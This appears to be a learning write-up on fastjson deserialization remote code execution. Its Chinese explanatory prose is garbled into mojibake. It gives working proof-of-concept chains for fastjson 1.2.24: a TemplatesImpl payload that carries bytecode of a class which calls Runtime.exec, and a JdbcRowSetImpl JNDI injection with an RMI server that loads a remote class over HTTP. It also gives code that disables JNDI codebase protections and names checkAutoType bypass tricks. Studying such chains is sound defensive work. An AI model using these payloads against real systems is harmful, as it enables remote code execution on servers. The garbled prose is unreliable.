éƒ½è¢«è°ƒç”¨ã€‚ å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ Feature.SupportNonPublicField å‚æ•°ã€‚ fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get/set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() æ–¹æ³•ï¼Œä¼šå¿½ç•¥ _|- å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´å“ªæ€•ä½ çš„å­—æ®µåå« _a_g_e_ï¼Œgetter æ–¹æ³•ä¸º getAge()ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ï¼Œåœ¨ 1.2.36 ç‰ˆæœ¬åŠåç»­ç‰ˆæœ¬è¿˜å¯ä»¥æ”¯æŒåŒæ—¶ä½¿ç”¨ _ å’Œ - è¿›è¡Œç»„åˆæ··æ·†ã€‚ fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º byte[]ï¼Œå°†ä¼šè°ƒç”¨com.alibaba.fastjson.parser.JSONScanner#bytesValue è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚ ä¸ºäº†æµ‹è¯•ä»¥ä¸Šå†…å®¹ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªdemo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 package com.reus09; import com.alibaba.fastjson.JSON; import java.io.UnsupportedEncodingException; import java.util.Arrays; import java.util.Properties; import java.util.Base64; /** * @ClassName FastJsonTest * @Description TODO * @Author reus09 * @Date 2022/10/11 19:34 * @Version 1.0 **/ public class FastJsonTest { public String t1; private Integer t2; private Boolean t3; private Properties t4; private Properties t5; private byte[] t6; @Override public String toString() { return \u0026#34;FastJsonTest{\u0026#34; + \u0026#34;t1=\u0026#39;\u0026#34; + t1 + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, t2=\u0026#34; + t2 + \u0026#34;, t3=\u0026#34; + t3 + \u0026#34;, t4=\u0026#34; + t4 + \u0026#34;, t5=\u0026#34; + t5 + \u0026#34;, t6=\u0026#34; + Arrays.toString(t6) + \u0026#39;}\u0026#39;; } public byte[] getT6() { return t6; } public void setT6(byte[] t6) { this.t6 = t6; } public FastJsonTest() { System.out.println(\u0026#34;FastJsonTest() is called \u0026#34;); } public void setT5(Properties t5) { System.out.println(\u0026#34;setT5()\u0026#34;); this.t5 = t5; } public void setT1(String t1) { System.out.println(\u0026#34;setT1()\u0026#34;); this.t1 = t1; } public void setT2(Integer t2) { System.out.println(\u0026#34;setT2()\u0026#34;); this.t2 = t2; } public String getT1() { System.out.println(\u0026#34;getT1()\u0026#34;); return t1; } public Integer getT2() { System.out.println(\u0026#34;getT2()\u0026#34;); return t2; } public Boolean getT3() { System.out.println(\u0026#34;getT3()\u0026#34;); return t3; } public Properties getT4() { System.out.println(\u0026#34;getT4()\u0026#34;); return t4; } public Properties getT5() { System.out.println(\u0026#34;getT5()\u0026#34;); return t5; } public static void main(String[] args) throws UnsupportedEncodingException { String jsonString = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.reus09.FastJsonTest\\\u0026#34;,\\\u0026#34;t1\\\u0026#34;:\\\u0026#34;t1\\\u0026#34;,\\\u0026#34;t2\\\u0026#34;:1,\\\u0026#34;t3\\\u0026#34;:1,\\\u0026#34;t4\\\u0026#34;:{},\\\u0026#34;t5\\\u0026#34;:{},\\\u0026#34;t6\\\u0026#34;:\\\u0026#34;\u0026#34;+Base64.getEncoder().encodeToString(\u0026#34;Hello,FastJson\u0026#34;.getBytes(\u0026#34;utf-8\u0026#34;))+\u0026#34;\\\u0026#34;}\u0026#34;; System.out.println(\u0026#34;---------JSON.parse(string)-----------\u0026#34;); Object obj = JSON.parse(jsonString); System.out.println(obj); System.out.println(\u0026#34;---------JSON.parseObject(string,clazz)-----------\u0026#34;); Object obj1 = JSON.parseObject(jsonString,FastJsonTest.class); System.out.println(obj1); System.out.println(\u0026#34;---------JSON.parseObject(string)-----------\u0026#34;); Object obj2 = JSON.parseObject(jsonString); System.out.println(obj2); } } è¿è¡Œç»“æœï¼š\næ€»çš„æ¥è¯´ï¼Œparse(string),parseObject(string,clazzs)ä¸parseObject(string)è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œparse(string) ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ setter æ–¹æ³•ï¼Œè€Œ parseObject(string) ç”±äºè¦å°†è¿”å›å€¼è½¬åŒ–ä¸ºJSONObjectï¼Œå¤šæ‰§è¡Œäº† JSON.toJSON(obj)ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„getter æ–¹æ³•æ¥å°†å‚æ•°èµ‹å€¼ç»™JSONObjectï¼Œæ‰€ä»¥ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒparseObject(string)çš„å±å®³æ€§ç›¸å¯¹ä¼šæ›´å¤§ã€‚\nFastJson 1.2.24åˆ†æ FastJson1.2.24å¼€å¯äº†FastJsonååºåˆ—å®ç°RCEçš„å¤§é—¨\nfastjson é»˜è®¤ä½¿ç”¨ @type æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ Java å¸¸è§ç¯å¢ƒä¸­å¯»æ‰¾èƒ½å¤Ÿæ„é€ æ¶æ„ç±»çš„æ–¹æ³•ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨çš„ getter/setter æ–¹æ³•ï¼Œä»¥åŠç›®æ ‡æˆå‘˜å˜é‡çš„æ³¨å…¥æ¥è¾¾åˆ°ä¼ å‚çš„ç›®çš„ï¼Œæœ€ç»ˆå½¢æˆæ¶æ„è°ƒç”¨é“¾ã€‚æ­¤æ¼æ´å¼€å¯äº† fastjson ååºåˆ—åŒ–æ¼æ´çš„å¤§é—¨ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜æä¾›äº†æ–°çš„æ€è·¯ã€‚\nè¿™é‡Œå¯¹1.2.24çš„ä¸¤æ¡å¸¸è§åˆ©ç”¨é“¾TemplatesImpl ååºåˆ—åŒ–å’ŒJdbcRowSetImpl ååºåˆ—åŒ–è¿›è¡Œç®€å•çš„å­¦ä¹ ã€‚\nTemplatesImpl ååºåˆ—åŒ– åˆ†æä¸€ä¸‹æ¼æ´åˆ©ç”¨é“¾çš„å…¨è¿‡ç¨‹ï¼Œå®é™…ä¸Šåœ¨æŸ¥é˜…èµ„æ–™çš„åŒæ—¶ï¼Œå‘ç°å…¶ä¹Ÿæ˜¯CommonsCollections-3é“¾å­çš„åˆ†æï¼Œå› ä¸ºåˆšåˆšæ¥è§¦åˆ°Javaå®‰å…¨,å¯¹CC3é“¾åªæ˜¯ç•¥æœ‰è€³é—»ï¼Œä¹‹åçš„å­¦ä¹ ä¹‹ä¸­ä¼šæ…¢æ…¢å­¦ä¹ CCé“¾çš„å„ç§åˆ©ç”¨å§¿åŠ¿ã€‚\nå‚è€ƒçš„å„ä½å¤§å¸ˆå‚…çš„åšå®¢å…³äºTemplateImplååºåˆ—åŒ–é“¾çš„æ€è€ƒéƒ½æ˜¯ä»æ¼æ´æŒ–æ˜çš„æ€è·¯å¼€å§‹ï¼Œä»getTransletInstance()è¿™ä¸ªå®ä¾‹åŒ–ç‚¹å‡ºå‘ï¼Œéœ€è¦å“ªä¸€ä¸ªåˆ©ç”¨å…ƒç´ å°±å»å¯»æ‰¾ï¼Œæœ€åå®Œå–„åˆ©ç”¨è¿‡ç¨‹ã€‚\nå‡½æ•°æ ˆè°ƒç”¨æƒ…å†µ:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 exec:348, Runtime (java.lang) \u0026lt;clinit\u0026gt;:22, Calculartor (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:193, JSON (com.alibaba.fastjson) main:117, FastJsonTest (com.reus09) é¦–å…ˆæˆ‘ä»¬åœ¨com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstanceå­˜åœ¨ä¸€ä¸ªæˆå‘˜å±æ€§ _classï¼Œæ˜¯ä¸€ä¸ª Class ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„é‡Œä¸‹æ ‡ä¸º_transletIndex çš„ç±»ä¼šåœ¨ getTransletInstance() æ–¹æ³•ä¸­ä½¿ç”¨ newInstance() å®ä¾‹åŒ–ã€‚\nåŒæ—¶æˆ‘ä»¬å‘ç°com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformerä¸­è°ƒç”¨äº†getTransletInstance()\næ–¹æ³•,åŒæ—¶,com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputPropertiesè°ƒç”¨äº†è¿™é‡Œçš„newTransformer()æ–¹æ³•ã€‚ è¿™é‡Œçš„getOutputProperties()æ–¹æ³•å°±æ˜¯å¯¹TemplatesImplç±»çš„ç§æœ‰å…ƒç´ outputPropertiesçš„getteræ–¹æ³•\né‚£ä¹ˆæˆ‘ä»¬åªè¦æ§åˆ¶_classä»¥åŠ_transletIndexå°±å¯ä»¥å®ç°ä»»æ„ç±»çš„å®ä¾‹åŒ–ï¼Œä»è€Œè§¦å‘æ¼æ´ã€‚\ndefineTransletClasses()ä¸newInstance()åœ¨åŒä¸€æ–¹æ³•å†…ï¼Œäºæ˜¯æŸ¥çœ‹ä¸€ä¸‹defineTransletClasses() çš„é€»è¾‘ã€‚\nå…ˆè¦æ±‚ _bytecodes ä¸ä¸ºç©ºï¼Œæ¥ç€å°±ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„ ClassLoader å»åŠ è½½ _bytecodes ä¸­çš„ byte[] ã€‚è€Œ _bytecodes ä¹Ÿæ˜¯è¯¥ç±»çš„æˆå‘˜å±æ€§ã€‚\n_bytecodeså˜é‡éç©ºå€¼æ—¶ï¼Œç¨‹åºå°†ä¼šæŠŠ_bytecodesæ•°ç»„ä¸­çš„å€¼å¾ªç¯å–å‡ºï¼Œä½¿ç”¨loader.defineClassæ–¹æ³•ä»å­—èŠ‚ç è½¬åŒ–ä¸ºClasså¯¹è±¡ï¼Œéšååèµ‹å€¼ç»™_class[i]ã€‚\nè€Œå¦‚æœè¿™ä¸ªç±»çš„çˆ¶ç±»ä¸º ABSTRACT_TRANSLET ä¹Ÿå°±æ˜¯com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletï¼Œå°±ä¼šå°†ç±»æˆå‘˜å±æ€§çš„ï¼Œ_transletIndex è®¾ç½®ä¸ºå½“å‰å¾ªç¯ä¸­çš„æ ‡è®°ä½ï¼Œè€Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œå°±æ˜¯_class[0]ã€‚å¦‚æœçˆ¶ç±»ä¸æ˜¯è¿™ä¸ªç±»ï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚\né‚£è¿™æ ·ä¸€æ¡å®Œæ•´çš„æ¼æ´è°ƒç”¨é“¾å°±å‘ˆç°å‡ºæ¥äº†ï¼š\næ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ _bytecodes æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ newInstance() å®ä¾‹åŒ–ã€‚ åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äºgetteræ–¹æ³• getOutputProperties()ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢« fastjson è°ƒç”¨ï¼Œè€Œè¿™ä¸ªæ–¹æ³•è§¦å‘äº†æ•´ä¸ªæ¼æ´åˆ©ç”¨æµç¨‹ï¼šgetOutputProperties() -\u0026gt; newTransformer() -\u0026gt; getTransletInstance() -\u0026gt; defineTransletClasses() / EvilClass.newInstance(). åŒæ—¶ä¸ºäº†ç¨‹åºåœ¨å®ä¾‹åŒ–ä¹‹å‰å› æŠ¥é”™é€€å‡ºï¼Œéœ€è¦å°†_nameå’Œ_tfactoryè®¾ç½®ä¸ä¸ºç©ºï¼Œ_tfactoryå¦‚æœä¸æŒ‡å®šä¼šå‡ºç°ç©ºæŒ‡é’ˆã€‚æŸ¥çœ‹_tfactoryçš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 private transient TransformerFactoryImpl _tfactory = null; å…·ä½“å®ç°ï¼š\nä¸€ä¸ªç»§æ‰¿äº†AbstractTransletçš„æ¶æ„ç±»,å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package com.reus09; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; /** * @ClassName Calculartor * @Description TODO * @Author reus09 * @Date 2022/10/12 15:42 * @Version 1.0 **/ public class Calculartor extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } payloadéƒ¨åˆ†ï¼š\nJSONå¯¹åº”çš„å¦‚ä¸‹:\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;: \u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;, \u0026#34;_bytecodes\u0026#34;: [\u0026#34;yv66vgAAADQA...CJAAk=\u0026#34;], \u0026#34;_name\u0026#34;: \u0026#34;reus09\u0026#34;, \u0026#34;_tfactory\u0026#34;: {}, \u0026#34;_outputProperties\u0026#34;: {}, } ä»£ç å¦‚ä¸‹:\n1 2 3 4 byte[] code = Files.readAllBytes(Paths.get(\u0026#34;/Users/reus09/Desktop/rce/FastJson/target/classes/com/reus09/Calculartor.class\u0026#34;)); String codeString = Base64.getEncoder().encodeToString(code); String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\u0026#34;,\\\u0026#34;_bytecodes\\\u0026#34;:[\\\u0026#34;\u0026#34;+Base64.getEncoder().encodeToString(code)+\u0026#34;\\\u0026#34;],\\\u0026#34;_name\\\u0026#34;:\\\u0026#34;reus09\\\u0026#34;,\\\u0026#34;_tfactory\\\u0026#34;:{ },\\\u0026#34;_outputProperties\\\u0026#34;:{ },\\\u0026#34;_version\\\u0026#34;:\\\u0026#34;1.0\\\u0026#34;,\\\u0026#34;allowedProtocols\\\u0026#34;:\\\u0026#34;all\\\u0026#34;}\u0026#34;; JSON.parse(payload, Feature.SupportNonPublicField); JdbcRowSetImpl ååºåˆ—åŒ– JdbcRowSetImpl ç±»ä½äº com.sun.rowset.JdbcRowSetImpl ï¼Œæ˜¯ javax.naming.InitialContext#lookup() å‚æ•°å¯æ§å¯¼è‡´çš„ JNDI æ³¨å…¥ã€‚\nJdbcRowSetImplè°ƒç”¨å‡½æ•°æ ˆ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 exec:348, Runtime (java.lang) \u0026lt;init\u0026gt;:19, badClassName (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getObjectFactoryFromReference:174, NamingManager (javax.naming.spi) getObjectInstance:330, NamingManager (javax.naming.spi) decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry) lookup:138, RegistryContext (com.sun.jndi.rmi.registry) lookup:205, GenericURLContext (com.sun.jndi.toolkit.url) lookup:417, InitialContext (javax.naming) connect:624, JdbcRowSetImpl (com.sun.rowset) setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) main:123, FastJsonTest (com.reus09) å…ˆçœ‹ä¸€ä¸‹ setAutoCommit() æ–¹æ³•ï¼Œåœ¨ conn ä¸ºç©ºæ—¶ï¼Œå°†ä¼šè°ƒç”¨ connect() æ–¹æ³•ã€‚\nç„¶ååœ¨connectæ–¹æ³•é‡Œé¢è°ƒç”¨äº† javax.naming.InitialContext#lookup() æ–¹æ³•ï¼Œå‚æ•°ä»æˆå‘˜å˜é‡ dataSource ä¸­è·å–ã€‚\né€šè¿‡å‡½æ•°æ ˆçš„å˜åŒ–ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ï¼Œåœ¨FastJsonè§£æå‡½æ•°parseå‡½æ•°ä½œç”¨çš„æ—¶å€™ï¼Œé€šè¿‡åå°„ç»™ç±»çš„å…ƒç´ èµ‹å€¼çš„æ—¶å€™å¼•èµ·çš„å‘½ä»¤æ‰§è¡Œã€‚ ç¼–å†™ä¸€ä¸ªJNDIæœåŠ¡\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package com.reus09; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; /** * @ClassName JDNIServer * @Description TODO * @Author reus09 * @Date 2022/10/12 18:09 * @Version 1.0 **/ public class JDNIServer { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1099); Reference reference = new Reference(\u0026#34;com.reus09.badClassName\u0026#34;, \u0026#34;com.reus09.badClassName\u0026#34;,\u0026#34;http://127.0.0.1:8000/\u0026#34;); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\u0026#34;Exploit\u0026#34;,referenceWrapper); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package com.reus09; import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class badClassName implements ObjectFactory { public badClassName() throws IOException { Runtime.getRuntime().exec(\u0026#34;open /System/Applications/Calculator.app\u0026#34;); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u0026lt;?, ?\u0026gt; environment) throws Exception { return null; } } Payloadéƒ¨åˆ†\nJSONæ ¼å¼\n1 2 3 4 5 { \u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;, \u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://127.0.0.1:1099/Exploit\u0026#34;, \u0026#34;autoCommit\u0026#34;:true } ä»£ç \n1 2 3 4 5 6 7 8 // è§£å†³javaç‰ˆæœ¬è¿‡é«˜çš„é—®é¢˜ï¼Œé»˜è®¤ä»¥ä¸‹çš„å…ƒç´ éƒ½ä¸ºfalse System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); System.setProperty(\u0026#34;com.sun.jndi.rmi.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); System.setProperty(\u0026#34;com.sun.jndi.cosnaming.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); System.out.println(\u0026#34;JdbcRowSetImpl é“¾çš„åˆ©ç”¨\u0026#34;); String payload2 = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;rmi://127.0.0.1:1099/Exploit\\\u0026#34;, \\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload2); AutoTypeä¸checkAutoType Fastjsonæä¾›äº†autotypeåŠŸèƒ½,å…è®¸ç”¨æˆ·åœ¨ååºåˆ—åŒ–æ•°æ®ä¸­é€šè¿‡â€œ@typeâ€æŒ‡å®šååºåˆ—åŒ–çš„Classç±»å‹ã€‚\nç®€å•çš„æ¥è¯´å°±æ˜¯ï¼šå½“ä¸€ä¸ªç±»ä¸­åŒ…å«äº†ä¸€ä¸ªæ¥å£ï¼ˆæˆ–æŠ½è±¡ç±»ï¼‰çš„æ—¶å€™ï¼Œåœ¨æ­£å¸¸ååºåˆ—åŒ–ä¸­ï¼Œä¼šå°†å­ç±»å‹æŠ¹å»ï¼Œåªä¿ç•™æ¥å£ï¼ˆæŠ½è±¡ç±»ï¼‰çš„ç±»å‹ï¼Œä½¿å¾—ååºåˆ—åŒ–æ—¶æ— æ³•æ‹¿åˆ°åŸå§‹ç±»å‹ã€‚FastJsoné€šè¿‡ä½¿ç”¨autotypeæ¥å¯¹æŒ‡å®šçš„@typeå®ç°çš„æ¥å£åŒæ ·è¿›è¡Œæ­£å¸¸ååºåˆ—åŒ–ã€‚\nå…·ä½“çš„è¯ï¼Œçœ‹pandaå¸ˆå‚…å¯¹AutoTypeèµ·åˆ°çš„ä½œç”¨è¿›è¡Œäº†ç®€å•çš„ä»‹ç»ã€‚\ncheckAutoTypeæ˜¯ FastJson åœ¨ 1.2.25 ä»¥åŠä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œä¸ºäº†é˜²æ­¢ autoType è¿™ä¸€æœºåˆ¶å¸¦æ¥çš„ å®‰å…¨éšæ‚£ï¼Œå¢åŠ çš„æ£€æµ‹é˜²å¾¡æœºåˆ¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹äº @type å±æ€§è¿›è¡Œç™½åå•+é»‘åå•çš„é™åˆ¶æœºåˆ¶ã€‚\næ—©æœŸç‰ˆæœ¬çš„checkAutoTypeå­˜åœ¨ä¸€äº›æ¯”è¾ƒä½çº§çš„ç»•è¿‡æ–¹æ³•ï¼Œå¦‚åŠ ä¸ŠLå¼€å¤´;ç»“å°¾ã€åŒå†™LLç»•è¿‡ ç­‰ï¼Œç›´åˆ°1.2.48ç‰ˆæœ¬åï¼ŒcheckAutoType å˜å¾—æˆç†Ÿï¼Œé»‘åå•ä¹Ÿé€æ¸å®Œå–„ã€‚\nå…¶å…·ä½“é€»è¾‘ï¼Œå¯ä»¥ç”¨ã€ŠHow i use json deserializationã€‹è®®é¢˜çš„ä¸€å¼ å›¾ç‰‡æ¦‚æ‹¬:\ncheckAutoTypeé¦–å…ˆä¼šå¯¹ä¼ å…¥çš„typeNameè¿›è¡Œ3é¡¹æ£€æµ‹:\næ˜¯å¦æ˜¯ç™½åå•ä¸­çš„ç±» æ˜¯å¦åœ¨ååºåˆ—åŒ–cacheä¸­(åœ¨mappingsåˆ—è¡¨) ç±»æœ‰JSONTypeæ³¨è§£(å¦‚:fastjson.annotation.JSONType) å¦‚æœæ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šç›´æ¥returnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½ å…¥cache\nå¦‚æœæ²¡æœ‰æ»¡è¶³å…¶ä¸­çš„ä¸€ä¸ªæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šè¿›å…¥å¦ä¸€ä¸ªåˆ¤æ–­:\nä¼ å…¥çš„typeNameæ˜¯å¦åœ¨é»‘åå•ä¸­ æ˜¯å¦ç»§æ‰¿è‡ªRowSetã€DataSourceã€ClassLoaderç­‰ç±» å¦‚æœæ»¡è¶³ä¸Šè¿°æ¡ä»¶ä¹‹ä¸€ï¼Œé‚£ä¹ˆç›´æ¥æŠ›å‡ºé”™è¯¯ å¦‚æœéƒ½ä¸æ»¡è¶³ï¼Œé‚£ä¹ˆä¼šè¿›è¡Œå¦‚ä¸‹åˆ¤æ–­:\nexpectClassä¸ä¸ºNULLã€Objectã€Serializableã€Closeableç­‰ç±»å‹ ä¼ å…¥çš„typeNameç±»ç»§æ‰¿äºexpctClass å¦‚æœæ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šç›´æ¥returnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½ å…¥cache\nå¦‚æœä¸æ»¡è¶³ï¼Œé‚£ä¹ˆä¼šç»è¿‡autoTypeSupportçš„åˆ¤æ–­ï¼ŒautoTypeSupportä¸»è¦ç”¨æ¥æ‰“å¼€autotypeåŠŸèƒ½ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯falseï¼ŒæŠ›å‡ºé”™è¯¯ï¼Œå¦‚æœè®¾ç½®çš„æ˜¯Trueé‚£ä¹ˆä¼šreturnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµ ç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½å…¥cacheã€‚\nå†å²æ¼æ´åˆ†æ fastjson-1.2.25 åœ¨ç‰ˆæœ¬ 1.2.25 ä¸­ï¼Œå®˜æ–¹å¯¹ä¹‹å‰çš„ååºåˆ—åŒ–æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œå¼•å…¥äº† checkAutoType å®‰å…¨æœºåˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ autoTypeSupport å…³é—­ï¼Œä¸èƒ½ç›´æ¥ååºåˆ—åŒ–ä»»æ„ç±»ï¼Œè€Œæ‰“å¼€ AutoType ä¹‹åï¼Œæ˜¯åŸºäºå†…ç½®é»‘åå•æ¥å®ç°å®‰å…¨çš„ï¼Œfastjson ä¹Ÿæä¾›äº†æ·»åŠ 